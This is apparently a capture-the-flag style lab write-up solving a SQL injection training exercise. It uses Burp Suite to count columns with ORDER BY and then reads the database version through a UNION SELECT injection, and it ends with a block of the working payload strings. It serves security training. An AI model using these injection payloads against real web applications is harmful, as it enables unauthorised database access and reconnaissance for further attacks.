# 📝 Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

- **Vulnerability:** SQL Injection.
- **Difficulty:** PRACTITIONER.
- **Objective:** Find out the database type and its exact version.

---

## 🛠️ Tools Used
- Browser (FoxyProxy)
- Burp Suite

---

## 🐾 Steps to Reproduce
1. Open the lab's main page, turn on the *FoxyProxy* extension, and click on any category (e.g., Pets).
2. Open **Burp Suite -> Proxy -> HTTP History**, find the request, and press `Ctrl+R` to send it to **Repeater**.
3. In Repeater, look at the first line of the request: `GET /filter?category=Pets HTTP/2`. The `category` parameter is our vulnerable injection point.
4. First, we need to find out how many columns are in the original query. We inject an `ORDER BY` payload right after the category value:
   `GET /filter?category=Pets'+ORDER+BY+1--` *(Note: the `+` sign is used as a URL-encoded space).* The response shows a *500 Internal Server Error*. Here we need to bypass the system, it's easy, just add a space in the comment syntax `(--+)` or `(--%20)`.
   Keep increasing the number (`ORDER BY 2`, `ORDER BY 3`) until the server throws an internal error. In this case, `ORDER BY 3` causes an error, which means there are exactly **2 columns**.
5. Now that we know the column count. Finally, we inject our payload to check the database version: `GET /filter?category=Pets'+UNION+SELECT+NULL,@@version--+`
   The server returns a **200 OK**, confirming our injection is working perfectly.
6. Done! The **Lab Solved** banner will pop up, and if you look at the response in Repeater, you will see the MSSQL or MySQL version strings printed on the page (e.g., `CORE 8.0.42-0ubuntu0.20.04.1 Production`).
<img width="1917" height="911" alt="Screenshot 2026-09-14 201011" src="https://github.com/user-attachments/assets/e5272876-5e73-4412-8839-bcb301843618" />

---

## 🎯 Impact
By knowing the exact type and version of the database, an attacker can easily escalate the attack. The easiest next step is looking up existing public vulnerabilities (CVEs) specific to that exact MSSQL or MySQL version for targeted and more dangerous exploitation.

---

## 💣 Payload
```sql
'+ORDER+BY+1--
'+UNION+SELECT+NULL,NULL+--+
'+UNION+SELECT+NULL,@@version--+
```
## 🔗 Reference:
For more powerful payloads, check out the [PortSwigger SQLi Cheat Sheet.](https://portswigger.net/web-security/sql-injection/cheat-sheet)
